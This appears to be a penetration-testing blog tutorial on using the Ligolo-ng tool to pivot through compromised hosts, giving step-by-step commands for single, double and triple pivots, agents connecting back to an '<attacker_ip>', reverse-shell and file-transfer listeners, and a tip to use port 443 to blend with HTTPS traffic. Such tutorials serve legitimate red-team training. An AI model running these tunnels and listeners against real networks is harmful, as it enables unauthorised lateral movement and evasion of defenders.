---
title: "Easier Way to Povit: Ligolo-ng"
date: 2026-06-04
weight: 2
# aliases: ["/first"]
tags: ["Ligolo","Pivoit"]
author: "Gourav."
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
# comments: false
description: "A practical Ligolo-ng guide covering tunneling, listeners, jump boxes, and multi-hop pivoting techniques."
summary: "A practical Ligolo-ng guide covering tunneling, listeners, jump boxes, and multi-hop pivoting techniques."

canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
# disableShare: false
# disableHLJS: false
hideSummary: false
# searchHidden: true
ShowReadingTime: true
# ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
# ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "/images/ligolocover.png" # image path/url
    alt: "Ligolo-ng" # alt text
    caption: "Ligolo make life easier" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
# editPost:
#     URL: "https://github.com/<path_to_repo>/content"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link

---

## What is Ligolo-ng?

Ligolo-ng is a tunneling and pivoting tool that enables access to internal networks through compromised hosts. By creating a virtual network interface (TUN), it allows attackers to route traffic, perform network reconnaissance, and reach otherwise inaccessible systems during penetration tests and red team operations.

{{< callout warning >}}
**Ligolo-ng Download:** : [Github](https://github.com/nicocha30/ligolo-ng)
{{< /callout >}}

{{< figure align="center" src="/images/ligolopivoit.png" caption="Pivoit map" >}}

## Single Pivot

### Server-Side Configuration

#### 1. Create the TUN Interface

```bash
sudo ip tuntap add user <your_username> mode tun ligolo
```

#### 2. Bring the Interface Up

```bash
sudo ip link set ligolo up
```

{{< callout insight "Cleanup: Remove the interface when no longer needed." >}}

**sudo ip link delete ligolo**

{{< /callout >}}

#### 3. Start the Ligolo Proxy

```bash
./proxy -selfcert -laddr 0.0.0.0:9001
```

{{< callout warning >}} **Note:** In real-world engagements, port **443** is often preferred for blending with legitimate HTTPS traffic.
{{< /callout >}}

#### 4. Add a Route to the Target Network

```bash
sudo ip route add 192.168.110.0/24 dev ligolo
```

---

### Client-Side Configuration

#### 1. Connect the Agent to the Proxy

```bash
./agent -connect <attacker_ip>:9001 -ignore-cert
```

#### 2. Start the Session

*From the Ligolo proxy console:*

```text
session <id>
start
```

---

### Useful Listeners

#### Reverse Shell / Port Forwarding

```bash
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

#### File Transfer

```bash
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
```

---

## Double Pivot

{{< callout tip >}}[**Reference:**](https://docs.ligolo.ng/sample/double/ ) 
{{< /callout>}}

### Server-Side Configuration

#### 1. Create a Second TUN Interface

```bash
sudo ip tuntap add user <your_username> mode tun ligolo-2
```

#### 2. Bring the Interface Up

```bash
sudo ip link set ligolo-2 up
```

#### 3. Create a Listener on the First Pivot

```bash
listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9001 --tcp
```

#### 4. Add a Route to the Internal Network

```bash
sudo ip route add 192.168.110.0/24 dev ligolo-2
```

---

### Client-Side Configuration

#### 1. Connect Through the First Pivot

```bash
./agent -connect <attacker_ip>:9999 -ignore-cert
```

#### 2. Start the Tunnel

```bash
tunnel_start --tun ligolo-2
```

---

### Useful Listeners

#### Reverse Shell / Port Forwarding

```bash
listener_add --addr 0.0.0.0:4321 --to 0.0.0.0:4444
```

#### File Transfer

```bash
listener_add --addr 0.0.0.0:1236 --to 0.0.0.0:8001
```

---

## Triple Pivot

### Server-Side Configuration

#### 1. Create a Third TUN Interface

```bash
sudo ip tuntap add user <your_username> mode tun ligolo-3
```

#### 2. Bring the Interface Up

```bash
sudo ip link set ligolo-3 up
```

#### 3. Forward Traffic Through the Previous Pivot

```bash
listener_add --addr 0.0.0.0:9002 --to 127.0.0.1:9001 --tcp
```

#### 4. Add a Route to the Deeper Internal Network

```bash
sudo ip route add 192.168.120.0/24 dev ligolo-3
```

---

### Client-Side Configuration

#### 1. Connect Through the Previous Pivot

```bash
./agent -connect <previous_pivot_ip>:9002 -ignore-cert
```

#### 2. Start the Tunnel

```bash
tunnel_start --tun ligolo-3
```

---

### Useful Listeners

#### Reverse Shell / Port Forwarding

```bash
listener_add --addr 0.0.0.0:4322 --to 0.0.0.0:4444
```

#### File Transfer

```bash
listener_add --addr 0.0.0.0:1237 --to 0.0.0.0:8002
```

---

## Jump Box Scenario

*A jump box can be used to access isolated networks while maintaining a single Ligolo tunnel.*

### Server-Side Configuration

#### 1. Create the TUN Interface

```bash
sudo ip tuntap add user <your_username> mode tun ligolo
```

#### 2. Bring the Interface Up

```bash
sudo ip link set ligolo up
```

#### 3. Start the Ligolo Proxy

```bash
./proxy -selfcert -laddr 0.0.0.0:9001
```

#### 4. Add a Host Route

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

---

### Client-Side Configuration

#### 1. Connect the Agent

```bash
./agent -connect <attacker_ip>:9001 -ignore-cert
```

#### 2. Start the Session

```text
session <id>
start
```

---

## Tips & Notes

{{< callout insight "Route Conflicts:" >}}  If multiple routes overlap or point to the same destination network, use route metrics to control path preference.
{{< /callout >}}

Example:

```bash
sudo ip route add 192.168.110.0/24 dev ligolo metric 100
```

> Lower metrics are preferred over higher metrics.

**Operational Security:** Replace {{< badge yellow >}}-selfcert{{< /badge>}} with a valid TLS certificate whenever possible during real-world assessments.

**Verification:**

*Always verify connectivity after establishing a pivot:*

```bash
ping <target_ip>
nmap -Pn <target_subnet>
```